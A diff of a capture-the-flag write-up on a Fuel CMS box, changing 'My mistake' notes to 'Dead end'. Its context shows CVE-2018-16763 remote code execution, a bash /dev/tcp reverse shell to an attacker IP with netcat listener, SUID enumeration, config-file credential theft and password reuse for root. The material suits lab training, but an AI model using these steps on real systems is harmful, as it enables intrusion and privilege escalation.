@@ -53,7 +53,7 @@ Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)         | php/webapps/50884.t
 
 Two filters narrowed it down: the SQL injections need **authentication** (I had no credentials), and the three RCEs cover **1.4.1**, which includes 1.4.
 
-**My mistake:** I picked 50477 "because it's in `php/` and it's a `.py`". The folder says what platform the **target** runs on (a PHP web app), not the exploit's language; 47138 is also Python. The only way to know what an exploit does is to read it.
+**Dead end:** I picked 50477 "because it's in `php/` and it's a `.py`". The folder says what platform the **target** runs on (a PHP web app), not the exploit's language; 47138 is also Python. The only way to know what an exploit does is to read it.
 
 ## 3. Initial access — CVE-2018-16763
 
@@ -100,10 +100,7 @@ Listener on Kali:
 nc -lvnp 1234
 ```
 
-**My mistakes here**, in order:
-
-1. I first ran the reverse shell **in my own Kali terminal** instead of in the exploit's `Enter Command $` prompt. It has to run on the target. (Kali uses zsh, which has no `/dev/tcp` either, so it failed with `no such file or directory`.)
-2. In the exploit prompt, `bash -i >& /dev/tcp/<MY_IP>/1234 0>&1` printed nothing and never connected.
+**Dead end:** in the exploit prompt, the usual one-liner `bash -i >& /dev/tcp/<MY_IP>/1234 0>&1` printed nothing and never connected.
 
 The reason: PHP's `system()` runs commands with **`/bin/sh`**, which on Ubuntu is **dash**. `/dev/tcp/host/port` isn't a real file, it's a bash feature, and `>&` is bash syntax too. dash doesn't understand either and fails silently. Wrapping it makes dash just launch bash, which does:
 
@@ -133,7 +130,7 @@ The user flag is in `/home/www-data/flag.txt`.
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-All standard Ubuntu binaries. **My mistake:** I flagged `vmware-user-suid-wrapper`, but it's part of the VMware guest tools and isn't on GTFOBins. The method: compare against a default install and check GTFOBins' SUID tab.
+All standard Ubuntu binaries. **Dead end:** I flagged `vmware-user-suid-wrapper`, but it's part of the VMware guest tools and isn't on GTFOBins. The method: compare against a default install and check GTFOBins' SUID tab.
 
 The actual path took me a while to see. I suggested SQLi, `/etc/passwd`, and `/etc/shadow` before getting there: a CMS connects to its database with a username and password, stored in a **config file inside the web root**, and www-data (the user running the web) can read it.
 
@@ -191,7 +188,6 @@ nmap → port 80 → "Welcome to FUEL CMS" + robots.txt /fuel/
 - **A CMS name + version is the first lead**: searchsploit before brute force or directory scans.
 - **Read the exploit before running it**, and filter by version and by whether it needs authentication. The searchsploit folder is the target's platform, not the exploit's language.
 - **`/dev/tcp` is bash-only.** Through PHP `system()`, cron, or anything using `sh`, wrap the reverse shell in `bash -c "..."`.
-- **Run payloads on the target, not on Kali.** Check the prompt before pressing Enter.
 - **As www-data, read the web app's config files first**: database credentials are almost always there.
 - **Try password reuse before the long way.** A password for a user called `root` is worth one `su`.
 - **Stabilise the shell with `pty` early**: `su` and `sudo` need a terminal.
